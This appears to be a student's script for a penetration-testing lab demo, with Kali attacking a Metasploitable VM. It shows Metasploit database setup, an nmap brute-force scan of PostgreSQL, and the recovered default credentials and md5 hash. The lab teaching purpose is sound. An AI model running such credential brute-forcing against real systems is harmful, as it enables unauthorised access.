# Script

## Talk about windows:
1. metasploitable vm, lower left corner
2. kali vm, lower right corner
3. wireshark to monitor network traffic during the attack

Project 2: Deliverable 1

- Demonstrate Reconaissance
- Demonstrate Vulnerability Analysis
- Demonstrate Credential Theft
- Demonstarte Exploitation
- Demonstrate Escalation
- Demonstrate Exfiltration

Tools:

- Kali, a Linux-based Penetration Testing OS, pre-packaged with various penetration testing applica$

- Metasploit Framework - a Ruby programming language-based, modular penetration testing platform th$
  tester  to write, test, and execute exploit code. The Metasploit Framework contains a suite of to$
  vulnerabilities, enumerate networks, execute attacks, and evade detection.

- Nmap - an open source tool for network exploration and security auditing.

## Setting up msf db

Using a database with the Metasploit Framework's `msfconsole` enhances performance, session management, and data persistence in penetration testing. It allows efficient tracking of sessions, maintains historical records of module execution, supports collaborative work, and enables resource management, making it a valuable tool for ethical hackers and security professionals.

```bash
# start postgresql service
service postgresql start

# initialize msf dabatase
msfdb init

# start msfconsole
msfconsole

# connect database
db_connect -y /usr/share/metasploit-framework/config/database.yml
```

## db_nmap

once we have our db connection established, we can run the db version of nmap. This allows us to automatically store the results of nmap into the ms framework. 

```
root@kali:/usr/share/nmap/scripts# ls -l
total 4808
-rw-r--r-- 1 root root  3901 Jan  9  2019 acarsd-info.nse
-rw-r--r-- 1 root root  8726 Jan  9  2019 address-info.nse
-rw-r--r-- 1 root root  3345 Jan  9  2019 afp-brute.nse
-rw-r--r-- 1 root root  6891 Jan  9  2019 afp-ls.nse
...
-rw-r--r-- 1 root root  2629 Jan  9  2019 wsdd-discover.nse
-rw-r--r-- 1 root root  2286 Jan  9  2019 x11-access.nse
-rw-r--r-- 1 root root  2095 Jan  9  2019 xdmcp-discover.nse
-rw-r--r-- 1 root root  4328 Jan  9  2019 xmlrpc-methods.nse
-rw-r--r-- 1 root root  4316 Jan  9  2019 xmpp-brute.nse
-rw-r--r-- 1 root root 17285 Jan  9  2019 xmpp-info.nse


root@kali:/usr/share/nmap/scripts# ls -l | grep pgsql
-rw-r--r-- 1 root root  5300 Jan  9  2019 pgsql-brute.nse

```

```bash
msf5 > db_nmap -script pgsql-brute.nse -p 5432 10.2.2.100
[*] Nmap: Starting Nmap 7.70 ( https://nmap.org ) at 2023-09-28 10:34 EDT
[*] Nmap: Stats: 0:01:33 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
[*] Nmap: NSE Timing: About 0.00% done
[*] Nmap: Nmap scan report for 10.2.2.100
[*] Nmap: Host is up (0.00038s latency).
[*] Nmap: PORT     STATE SERVICE
[*] Nmap: 5432/tcp open  postgresql
[*] Nmap: MAC Address: 00:0C:29:30:E1:15 (VMware)
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 249.41 seconds
msf5 > 

```


```
msf5 > creds
Credentials
===========

host        origin      service                public    private                              realm     private_type  JtR Format
----        ------      -------                ------    -------                              -----     ------------  ----------
                                               postgres  postgres                                       Password      
10.2.2.100  10.2.2.100  5432/tcp (postgresql)  postgres  postgres                             postgres  Password      
10.2.2.100  10.2.2.100  5432/tcp (postgresql)  postgres  md53175bce1d3201d16594cebf9d7eb3f9d            Postgres md5  raw-md5,postgres
```